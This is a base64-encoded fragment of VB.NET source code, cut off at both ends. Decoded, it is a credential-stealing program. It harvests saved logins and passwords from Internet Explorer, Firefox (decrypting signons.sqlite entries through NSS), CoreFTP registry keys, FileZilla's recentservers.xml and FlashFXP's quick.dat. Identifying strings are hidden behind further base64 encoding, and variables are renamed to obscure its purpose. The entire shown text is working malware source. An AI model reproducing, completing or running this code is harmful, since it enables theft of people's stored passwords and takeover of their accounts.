B0cihwdHJEYXRhLlRvSW50MzIoKSArIGhIZWFkZXIuZHdTdHJ1Y3RTaXplKQ0KICAgICAgICAgICAgICAgIERpbSBzdHJ1Y3REYXRhIEFzIE5ldyBJbnRQdHIoZW50cnlEYXRhLlRvSW50MzIoKSArICgoaEhlYWRlci5kd0VudHJpZXNDb3VudCArIDApICogTWFyc2hhbC5TaXplT2YoaEVudHJ5KSkpDQogICAgICAgICAgICAgICAgRGltIGkgQXMgSW50ZWdlciA9IDANCiAgICAgICAgICAgICAgICBXaGlsZSBpIDwgKGhIZWFkZXIuZHdFbnRyaWVzQ291bnQgLyAyKQ0KICAgICAgICAgICAgICAgICAgICBJZiBpIDw+IDAgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgZW50cnlEYXRhID0gTmV3IEludFB0cihlbnRyeURhdGEuVG9JbnQzMigpICsgTWFyc2hhbC5TaXplT2YoaEVudHJ5KSkNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIGhFbnRyeSA9IERpcmVjdENhc3QoTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShlbnRyeURhdGEsIGhFbnRyeS5bR2V0VHlwZV0oKSksIFN0cmluZ0luZGV4RW50cnkpDQogICAgICAgICAgICAgICAgICAgIERpbSBzVXNlcm5hbWUgQXMgU3RyaW5nID0gTWFyc2hhbC5QdHJUb1N0cmluZ0F1dG8oTmV3IEludFB0cihzdHJ1Y3REYXRhLlRvSW50MzIoKSArIGhFbnRyeS5kd0RhdGFPZmZzZXQpKQ0KICAgICAgICAgICAgICAgICAgICBlbnRyeURhdGEgPSBOZXcgSW50UHRyKGVudHJ5RGF0YS5Ub0ludDMyKCkgKyBNYXJzaGFsLlNpemVPZihoRW50cnkpKQ0KICAgICAgICAgICAgICAgICAgICBoRW50cnkgPSBEaXJlY3RDYXN0KE1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUoZW50cnlEYXRhLCBoRW50cnkuW0dldFR5cGVdKCkpLCBTdHJpbmdJbmRleEVudHJ5KQ0KICAgICAgICAgICAgICAgICAgICBEaW0gc1Bhc3N3b3JkIEFzIFN0cmluZyA9IE1hcnNoYWwuUHRyVG9TdHJpbmdBdXRvKE5ldyBJbnRQdHIoc3RydWN0RGF0YS5Ub0ludDMyKCkgKyBoRW50cnkuZHdEYXRhT2Zmc2V0KSkNCiAgICAgICAgICAgICAgICAgICAgaWVkYXRhID0gaWVkYXRhICYgIn5+fn5+SUUgNy84fn5+fn4iDQogICAgICAgICAgICAgICAgICAgIGllZGF0YSA9IGllZGF0YSAmIEVudmlyb25tZW50Lk5ld0xpbmUNCiAgICAgICAgICAgICAgICAgICAgaWVkYXRhID0gaWVkYXRhICYgIlVSTDogIiArIHNVUkwNCiAgICAgICAgICAgICAgICAgICAgaWVkYXRhID0gaWVkYXRhICYgRW52aXJvbm1lbnQuTmV3TGluZQ0KICAgICAgICAgICAgICAgICAgICBpZWRhdGEgPSBpZWRhdGEgJiAoIlVzZXJuYW1lOiAiICsgc1VzZXJuYW1lKQ0KICAgICAgICAgICAgICAgICAgICBpZWRhdGEgPSBpZWRhdGEgJiBFbnZpcm9ubWVudC5OZXdMaW5lDQogICAgICAgICAgICAgICAgICAgIGllZGF0YSA9IGllZGF0YSAmICgiUGFzc3dvcmQ6ICIgKyBzUGFzc3dvcmQpDQogICAgICAgICAgICAgICAgICAgIGllZGF0YSA9IGllZGF0YSAmIEVudmlyb25tZW50Lk5ld0xpbmUNCiAgICAgICAgICAgICAgICAgICAgaWVkYXRhID0gaWVkYXRhICYgIn5+fn5+fn5+fn4iDQogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5NYXRoLk1heChTeXN0ZW0uVGhyZWFkaW5nLkludGVybG9ja2VkLkluY3JlbWVudChpKSwgaSAtIDEpDQoNCiAgICAgICAgICAgICAgICBFbmQgV2hpbGUNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBFbmQgSWYNCiAgICAgICAgRXhpdCBTdWINCiAgICBFbmQgU3ViDQogICAgUHVibGljIEZ1bmN0aW9uIFZhclB0cihCeVZhbCBvIEFzIE9iamVjdCkgQXMgSW50UHRyDQogICAgICAgIERpbSBHQyBBcyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuR0NIYW5kbGUgPSBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuR0NIYW5kbGUuQWxsb2MobywgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkdDSGFuZGxlVHlwZS5QaW5uZWQpDQogICAgICAgIFJldHVybiBHQy5BZGRyT2ZQaW5uZWRPYmplY3QoKQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1YmxpYyBGdW5jdGlvbiBSaWdodChCeVZhbCBwYXJhbSBBcyBTdHJpbmcsIEJ5VmFsIGxlbmd0aCBBcyBJbnRlZ2VyKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIHJlc3VsdDMzIEFzIFN0cmluZyA9IHBhcmFtLlN1YnN0cmluZyhwYXJhbS5MZW5ndGggLSBsZW5ndGgsIGxlbmd0aCkNCiAgICAgICAgUmV0dXJuIHJlc3VsdDMzDQogICAgRW5kIEZ1bmN0aW9uDQogICAgUHVibGljIEZ1bmN0aW9uIE1pZChCeVZhbCBwYXJhbSBBcyBTdHJpbmcsIEJ5VmFsIHN0YXJ0SW5kZXggQXMgSW50ZWdlciwgQnlWYWwgbGVuZ3RoIEFzIEludGVnZXIpIEFzIFN0cmluZw0KICAgICAgICBEaW0gcmVzdWx0IEFzIFN0cmluZyA9IHBhcmFtLlN1YnN0cmluZyhzdGFydEluZGV4LCBsZW5ndGgpDQogICAgICAgIFJldHVybiByZXN1bHQNCiAgICBFbmQgRnVuY3Rpb24NCkVuZCBNb2R1bGUNCk1vZHVsZSBDb3JlRlRQDQogICAgRnVuY3Rpb24gQ29yZUZUUCgpIEFzIFN0cmluZw0KICAgICAgICBEaW0gc1BhdGggQXMgU3RyaW5nID0gRW52aXJvbiQoIkFQUERBVEEiKSAmICJcQ29yZUZUUFxzaXRlcy5pZHgiDQogICAgICAgIERpbSBzRmlsZSBBcyBTdHJpbmcgPSBSZWFkRmlsZShzUGF0aCkNCiAgICAgICAgRGltIHNIb3N0IEFzIFN0cmluZyA9IFJlZ1JlYWQoIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXEZUUFdhcmVcQ09SRUZUUFxTaXRlc1wiICYgc0ZpbGUgJiAiXEhvc3QiKQ0KICAgICAgICBEaW0gc1BvcnQgQXMgU3RyaW5nID0gUmVnUmVhZCgiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcRlRQV2FyZVxDT1JFRlRQXFNpdGVzXCIgJiBzRmlsZSAmICJcUG9ydCIpDQogICAgICAgIERpbSBzVXNlciBBcyBTdHJpbmcgPSBSZWdSZWFkKCJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxGVFBXYXJlXENPUkVGVFBcU2l0ZXNcIiAmIHNGaWxlICYgIlxVc2VyIikNCiAgICAgICAgRGltIHNQd2QgQXMgU3RyaW5nID0gUmVnUmVhZCgiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcRlRQV2FyZVxDT1JFRlRQXFNpdGVzXCIgJiBzRmlsZSAmICJcUFciKQ0KICAgICAgICBEaW0gc0VudHJ5IEFzIFN0cmluZyA9IFJlZ1JlYWQoIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXEZUUFdhcmVcQ09SRUZUUFxTaXRlc1wiICYgc0ZpbGUgJiAiXE5hbWUiKQ0KDQogICAgICAgIElmIE5vdCBzVXNlciA9ICIiIFRoZW4NCiAgICAgICAgICAgIFRyeQ0KICAgICAgICAgICAgICAgIENvcmVGVFAgPSAiRW50cnk6ICIgKyBzRW50cnkgKyB2Yk5ld0xpbmUgKyAiSG9zdDogIiArIHNIb3N0ICsgIjoiICsgc1BvcnQgKyB2Yk5ld0xpbmUgKyAiVXNlcjogIiArIHNVc2VyICsgdmJOZXdMaW5lICsgIlB3ZDogIiArIHNQd2QgKyAiIChFbmNyeXB0KSINCiAgICAgICAgICAgICAgICBEaW0gbmwgQXMgU3RyaW5nID0gdmJOZXdMaW5lDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIn5+fn5+Q29yZUZUUH5+fn5+IikNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiRW50cnk6ICIgJiBzRW50cnkpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIkhvc3Q6ICIgJiBzSG9zdCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiOiAiICYgc1BvcnQpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIlVzZXI6ICIgJiBzVXNlcikNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiUGFzc3dvcmQ6ICIgJiBzUHdkKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJ+fn5+fn5+fn5+IikNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0KDQogICAgICAgICAgICBFbmQgVHJ5DQogICAgICAgIEVsc2UNCiAgICAgICAgRW5kIElmDQogICAgICAgIFJldHVybiBOb3RoaW5nDQogICAgRW5kIEZ1bmN0aW9uDQoJUHVibGljIEZ1bmN0aW9uIFIyVjBSa1koKSBhcyBzdHJpbmcNCg0KICAgICAgICBEaW0gWzEwNl0gQXMgQm9vbGVhbiA9IEZhbHNlDQogICAgICAgIERpbSBbMTA3XSBBcyBMb25nID0gMA0KICAgICAgICBEaW0gWzEwOF0gQXMgU3RyaW5nID0gRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLlByb2dyYW1maWxlcykgJiAiXCIgJiBbMjRdLls0Ml0oIlRXOTZhV3hzWVE9PSIpICYgIiAiICYgWzI0XS5bNDJdKCJSbWx5WldadmVBPT0iKSAmICJcIg0KICAgICAgICBEaW0gWzEwOV0gQXMgU3RyaW5nID0gRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLkFwcGxpY2F0aW9uRGF0YSkgJiAiXCIgJiBbMjRdLls0Ml0oIlRXOTZhV3hzWVE9PSIpICYgIlwiICYgWzI0XS5bNDJdKCJSbWx5WldadmVBPT0iKSAmICJcIiAmIFsyNF0uWzQyXSgiVUhKdlptbHNaWE09IikNCiAgICAgICAgRGltIFsxMTBdIEFzIFN0cmluZygpID0gRGlyZWN0b3J5LkdldERpcmVjdG9yaWVzKFsxMDldKQ0KICAgICAgICBGb3IgRWFjaCBbMTEyXSBBcyBTdHJpbmcgSW4gWzExMF0NCiAgICAgICAgICAgIElmIE5vdCBbMTA2XSBUaGVuDQogICAgICAgICAgICAgICAgRGltIFsxMTNdIEFzIFN0cmluZygpID0gRGlyZWN0b3J5LkdldEZpbGVzKFsxMTJdKQ0KICAgICAgICAgICAgICAgIEZvciBFYWNoIFsxMTRdIEFzIFN0cmluZyBJbiBbMTEzXQ0KICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzEwNl0gVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4LklzTWF0Y2goWzExNF0sIFsyNF0uWzQyXSgiYzJsbmJtOXVjeTV6Y1d4cGRHVT0iKSkgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5TU19Jbml0KFsxMTJdKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpZ25vbiA9IFsxMTRdDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRWxzZQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBFeGl0IEZvcg0KICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICBOZXh0DQogICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgRXhpdCBGb3INCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBOZXh0DQoNCiAgICAgICAgRGltIFsxMTVdIEFzIFN0cmluZyA9IHNpZ25vbg0KICAgICAgICBEaW0gWzExNl0gQXMgTmV3IFRTRUNJdGVtKCkNCiAgICAgICAgRGltIFsxMTddIEFzIE5ldyBUU0VDSXRlbSgpDQogICAgICAgIERpbSBbMTE4XSBBcyBOZXcgVFNFQ0l0ZW0oKQ0KICAgICAgICBEaW0gWzExOV0gQXMgQnl0ZSgpDQogICAgICAgIERpbSBbMTIwXSBBcyBOZXcgU1FMaXRlQmFzZShbMTE1XSkNCg0KICAgICAgICBEaW0gWzEyMV0gQXMgRGF0YVRhYmxlID0gWzEyMF0uRXhlY3V0ZVF1ZXJ5KCJTRUxFQ1QgKiBGUk9NIG1vel9sb2dpbnM7IikNCiAgICAgICAgRGltIFsxMjJdIEFzIERhdGFUYWJsZSA9IFsxMjBdLkV4ZWN1dGVRdWVyeSgiU0VMRUNUICogRlJPTSBtb3pfZGlzYWJsZWRIb3N0czsiKQ0KDQoNCiAgICAgICAgWzEwN10gPSBQSzExX0dldEludGVybmFsS2V5U2xvdCgpDQogICAgICAgIFBLMTFfQXV0aGVudGljYXRlKFsxMDddLCBUcnVlLCAwKQ0KICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn4iICYgWzI0XS5bNDJdKCJSbWx5WldadmVBPT0iKSAmICJ+fn5+fiIgJiB2Yk5ld0xpbmUpDQoNCiAgICAgICAgRm9yIEVhY2ggWmVpbGUgQXMgU3lzdGVtLkRhdGEuRGF0YVJvdyBJbiBbMTIxXS5Sb3dzDQogICAgICAgICAgICBEaW0gWzEyM10gQXMgU3RyaW5nID0gU3lzdGVtLkNvbnZlcnQuVG9TdHJpbmcoWmVpbGUoImZvcm1TdWJtaXRVUkwiKS5Ub1N0cmluZygpKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoWzI0XS5bNDJdKCJWWEpzIikgJiAiOiAiICYgWzEyM10gJiB2Yk5ld0xpbmUpDQogICAgICAgICAgICBEaW0gWzEyNF0gQXMgTmV3IFN0cmluZ0J1aWxkZXIoWmVpbGUoImVuY3J5cHRlZFVzZXJuYW1lIikuVG9TdHJpbmcoKSkNCiAgICAgICAgICAgIERpbSBbMTI1XSBBcyBJbnRlZ2VyID0gTlNTQmFzZTY0X0RlY29kZUJ1ZmZlcihJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIFsxMjRdLCBbMTI0XS5MZW5ndGgpDQogICAgICAgICAgICBEaW0gWzEyNl0gQXMgVFNFQ0l0ZW0gPSBEaXJlY3RDYXN0KE1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUoTmV3IEludFB0cihbMTI1XSksIEdldFR5cGUoVFNFQ0l0ZW0pKSwgVFNFQ0l0ZW0pDQogICAgICAgICAgICBJZiBQSzExU0RSX0RlY3J5cHQoWzEyNl0sIFsxMTddLCAwKSA9IDAgVGhlbg0KICAgICAgICAgICAgICAgIElmIFsxMTddLlNFQ0l0ZW1MZW4gPD4gMCBUaGVuDQogICAgICAgICAgICAgICAgICAgIFsxMTldID0gTmV3IEJ5dGUoWzExN10uU0VDSXRlbUxlbiAtIDEpIHt9DQogICAgICAgICAgICAgICAgICAgIE1hcnNoYWwuQ29weShOZXcgSW50UHRyKFsxMTddLlNFQ0l0ZW1EYXRhKSwgWzExOV0sIDAsIFsxMTddLlNFQ0l0ZW1MZW4pDQogICAgICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KFsyNF0uWzQyXSgiVlhObGNtNWhiV1U9IikgJiAiOiAiICYgIFN5c3RlbS5UZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhbMTE5XSkgJiB2Yk5ld0xpbmUpDQogICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBFbmQgSWYNCgkJCQ0KCQkJDQogICAgICAgICAgICBEaW0gWzEyN10gQXMgTmV3IFN0cmluZ0J1aWxkZXIoWmVpbGUoImVuY3J5cHRlZFBhc3N3b3JkIikuVG9TdHJpbmcoKSkNCiAgICAgICAgICAgIERpbSBbMTI4XSBBcyBJbnRlZ2VyID0gTlNTQmFzZTY0X0RlY29kZUJ1ZmZlcihJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIFsxMjddLCBbMTI3XS5MZW5ndGgpDQogICAgICAgICAgICBEaW0gWzEyOV0gQXMgVFNFQ0l0ZW0gPSBEaXJlY3RDYXN0KE1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUoTmV3IEludFB0cihbMTI4XSksIEdldFR5cGUoVFNFQ0l0ZW0pKSwgVFNFQ0l0ZW0pDQogICAgICAgICAgICBJZiBQSzExU0RSX0RlY3J5cHQoWzEyOV0sIFsxMThdLCAwKSA9IDAgVGhlbg0KICAgICAgICAgICAgICAgIElmIFsxMThdLlNFQ0l0ZW1MZW4gPD4gMCBUaGVuDQogICAgICAgICAgICAgICAgICAgIFsxMTldID0gTmV3IEJ5dGUoWzExOF0uU0VDSXRlbUxlbiAtIDEpIHt9DQogICAgICAgICAgICAgICAgICAgIE1hcnNoYWwuQ29weShOZXcgSW50UHRyKFsxMThdLlNFQ0l0ZW1EYXRhKSwgWzExOV0sIDAsIFsxMThdLlNFQ0l0ZW1MZW4pDQogICAgICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KFsyNF0uWzQyXSgiVUdGemMzZHZjbVE9IikgJiAiOiAiICYgU3lzdGVtLlRleHQuRW5jb2RpbmcuQVNDSUkuR2V0U3RyaW5nKFsxMTldKSAmIHZiTmV3TGluZSkNCiAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIEVuZCBJZg0KDQoNCiAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJ+fn5+fn5+fn5+fiIgJiB2Yk5ld0xpbmUpDQoNCiAgICAgICAgTmV4dA0KICAgICAgICANCiAgICBFbmQgRnVuY3Rpb24NCgkNCiAgICBGdW5jdGlvbiBSZWFkRmlsZShCeVZhbCBzRmlsZSBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICBEaW0gT3BlbkZpbGUgQXMgTmV3IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIoc0ZpbGUpDQogICAgICAgIFJlYWRGaWxlID0gT3BlbkZpbGUuUmVhZFRvRW5kLlRvU3RyaW5nDQogICAgRW5kIEZ1bmN0aW9uDQogICAgRnVuY3Rpb24gQ3V0KEJ5VmFsIHNJbmhhbHQgQXMgU3RyaW5nLCBCeVZhbCBzVGV4dCBBcyBTdHJpbmcsIEJ5VmFsIHN0ZXh0MiBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICBEaW0gYygpIEFzIFN0cmluZw0KICAgICAgICBEaW0gYzIoKSBBcyBTdHJpbmcNCiAgICAgICAgYyA9IFNwbGl0KHNJbmhhbHQsIHNUZXh0KQ0KICAgICAgICBjMiA9IFNwbGl0KGMoMSksIHN0ZXh0MikNCiAgICAgICAgQ3V0ID0gYzIoMCkNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBGdW5jdGlvbiBSZWdSZWFkKEJ5VmFsIGhLZXkgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIHdzaFNoZWxsIEFzIE9iamVjdCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgICAgIFJlZ1JlYWQgPSB3c2hTaGVsbC5SZWdSZWFkKGhLZXkpDQogICAgRW5kIEZ1bmN0aW9uDQogICAgUHVibGljIEZ1bmN0aW9uIFJlYWRMaW5lKEJ5VmFsIGZpbGVuYW1lIEFzIFN0cmluZywgXw0KICAgIEJ5VmFsIGxpbmUgQXMgSW50ZWdlcikgQXMgU3RyaW5nDQogICAgICAgIFRyeQ0KICAgICAgICAgICAgRGltIGxpbmVzIEFzIFN0cmluZygpID0gTXkuQ29tcHV0ZXIuRmlsZVN5c3RlbS5SZWFkQWxsVGV4dCggXw0KICAgICAgICAgICAgICBmaWxlbmFtZSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdCkuU3BsaXQodmJDckxmKQ0KICAgICAgICAgICAgSWYgbGluZSA+IDAgVGhlbg0KICAgICAgICAgICAgICAgIFJldHVybiBsaW5lcyhsaW5lIC0gMSkNCiAgICAgICAgICAgIEVsc2VJZiBsaW5lIDwgMCBUaGVuDQogICAgICAgICAgICAgICAgUmV0dXJuIGxpbmVzKGxpbmVzLkxlbmd0aCArIGxpbmUgLSAxKQ0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIFJldHVybiAiIg0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0KICAgICAgICAgICAgUmV0dXJuICIiDQogICAgICAgIEVuZCBUcnkNCiAgICBFbmQgRnVuY3Rpb24NCkVuZCBNb2R1bGUNCg0KDQogICAgDQoNCk1vZHVsZSBGaWxlemlsbGENCiAgICBGdW5jdGlvbiBTaG9pdFppbGxhKCkgQXMgU3RyaW5nDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgICAgIERpbSBGaWxlUGF0aCBBcyBTdHJpbmcgPSBFbnZpcm9uKCJBUFBEQVRBIikgJiAiXEZpbGVaaWxsYVxyZWNlbnRzZXJ2ZXJzLnhtbCINCiAgICAgICAgRGltIEZpbGVCdWZmZXIgQXMgU3RyaW5nID0gdmJOdWxsDQogICAgICAgIERpbSBOTCBBcyBTdHJpbmcgPSB2Yk5ld0xpbmUNCiAgICAgICAgRmlsZUJ1ZmZlciA9IE15LkNvbXB1dGVyLkZpbGVTeXN0ZW0uT3BlblRleHRGaWxlUmVhZGVyKEZpbGVQYXRoKS5SZWFkVG9FbmQoKQ0KICAgICAgICBEaW0gc3RyIEFzIFN0cmluZw0KICAgICAgICBEaW0gT3V0cHV0IEFzIFN0cmluZyA9IE5vdGhpbmcNCiAgICAgICAgRGltIFRlbXBEYXRhKCkgQXMgU3RyaW5nDQogICAgICAgIFRlbXBEYXRhID0gRmlsZUJ1ZmZlci5TcGxpdCh2YkNyTGYpDQogICAgICAgIEZpbGVCdWZmZXIgPSBOb3RoaW5nDQogICAgICAgIEZvciBFYWNoIHN0ciBJbiBUZW1wRGF0YQ0KICAgICAgICAgICAgSWYgc3RyLkNvbnRhaW5zKCI8L0hvc3Q+IikgVGhlbg0KICAgICAgICAgICAgICAgIHN0ci5SZXBsYWNlKCI8SG9zdD4iLCAiIikuUmVwbGFjZSgiPC9Ib3N0PiIsICIiKQ0KICAgICAgICAgICAgICAgIE91dHB1dCA9IE91dHB1dCAmICJIb3N0IDogIiAmIHN0ciAmIE5MDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIElmIHN0ci5Db250YWlucygiPC9Vc2VyPiIpIFRoZW4NCiAgICAgICAgICAgICAgICBzdHIuUmVwbGFjZSgiPFVzZXI+IiwgIiIpLlJlcGxhY2UoIjwvVXNlcj4iLCAiIikNCiAgICAgICAgICAgICAgICBPdXRwdXQgPSBPdXRwdXQgJiAiVXNlcm5hbWUgOiAiICYgc3RyICYgTkwNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgSWYgc3RyLkNvbnRhaW5zKCI8L1Bhc3M+IikgVGhlbg0KICAgICAgICAgICAgICAgIHN0ci5SZXBsYWNlKCI8UGFzcz4iLCAiIikuUmVwbGFjZSgiPC9QYXNzPiIsICIiKQ0KICAgICAgICAgICAgICAgIE91dHB1dCA9IE91dHB1dCAmICJQYXNzd29yZCA6ICIgJiBzdHIgJiBOTCAmIE5MDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgTmV4dA0KICAgICAgICBPdXRwdXQgPSAifn5+fn5GaWxlWmlsbGF+fn5+fiIgJiB2Yk5ld0xpbmUgJiBPdXRwdXQuUmVwbGFjZSgiPFVzZXI+IiwgIiIpLlJlcGxhY2UoIjwvVXNlcj4iLCAiIikuUmVwbGFjZSgiPEhvc3Q+IiwgIiIpLlJlcGxhY2UoIjwvSG9zdD4iLCAiIikuUmVwbGFjZSgiPFBhc3M+IiwgIiIpLlJlcGxhY2UoIjwvUGFzcz4iLCAiIikgJiAifn5+fn5+fn5+fiIgJiB2Ym5ld2xpbmUNCiAgICAgICAgU2hvaXRaaWxsYSA9IE91dHB1dA0KICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChPdXRwdXQpDQogICAgRW5kIEZ1bmN0aW9uDQpFbmQgTW9kdWxlDQpNb2R1bGUgRmxhc2hGWFANCiAgICBGdW5jdGlvbiBGbGFzaEZYUCgpIEFzIFN0cmluZw0KICAgICAgICBEaW0gc1BhdGggQXMgU3RyaW5nID0gUmVwbGFjZShFbnZpcm9uJCgiQVBQREFUQSIpLCBFbnZpcm9uJCgiVXNlcm5hbWUiKSwgIkFsbCBVc2VycyIpICYgIlxGbGFzaEZYUFwiICYgIjMiICYgIlxxdWljay5kYXQiDQogICAgICAgIERpbSBzRmlsZSBBcyBTdHJpbmcgPSBSZWFkRmlsZShzUGF0aCkNCiAgICAgICAgRGltIHNIb3N0IEFzIFN0cmluZyA9IEN1dChzRmlsZSwgIklQPSIsIHZiTmV3TGluZSkNCiAgICAgICAgRGltIHNQb3J0IEFzIFN0cmluZyA9IEN1dChzRmlsZSwgInBvcnQ9IiwgdmJOZXdMaW5lKQ0KICAgICAgICBEaW0gc1VzZXIgQXMgU3RyaW5nID0gQ3V0KHNGaWxlLCAidXNlcj0iLCB2Yk5ld0xpbmUpDQogICAgICAgIERpbSBzUHdkIEFzIFN0cmluZyA9IEN1dChzRmlsZSwgInBhc3M9IiwgdmJOZXdMaW5lKQ0KICAgICAgICBEaW0gc0VudHJ5IEFzIFN0cmluZyA9IEN1dChzRmlsZSwgImNyZWF0ZWQ9IiwgdmJOZXdMaW5lKQ0KDQogICAgICAgIElmIE5vdCBzVXNlciA9ICIiIFRoZW4NCiAgICAgICAgICAgIFRyeQ0KICAgICAgICAgICAgICAgIEZsYXNoRlhQID0gIkVudHJ5OiAiICsgc0VudHJ5ICsgdmJOZXdMaW5lICsgIkhvc3Q6ICIgKyBzSG9zdCArICI6IiArIHNQb3J0ICsgdmJOZXdMaW5lICsgIlVzZXI6ICIgKyBzVXNlciArIHZiTmV3TGluZSArICJQd2Q6ICIgKyBzUHdkICsgIiAoRW5jcnlwdCkiDQogICAgICAgICAgICAgICAgRGltIG5sIEFzIFN0cmluZyA9IHZiTmV3TGluZQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJ+fn5+fkZsYXNoRlhQfn5+fn4iKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJFbnRyeTogIiAmIHNFbnRyeSkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiSG9zdDogIiAmIHNIb3N0KQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCI6ICIgJiBzUG9ydCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiVXNlcjogIiAmIHNVc2VyKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJQYXNzd29yZDogIiAmIHNQd2QpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIn5+fn5+fn5+fn4iKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgQ2F0Y2ggZXggQXMgRXhjZXB0aW9uDQoNCiAgICAgICAgICAgIEVuZCBUcnkNCiAgICAgICAgRWxzZQ0KICAgICAgICBFbmQgSWYNCiAgICAgICAgUmV0dXJuIE5vdGhpbmcNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBGdW5jdGlvbiBSZWFkR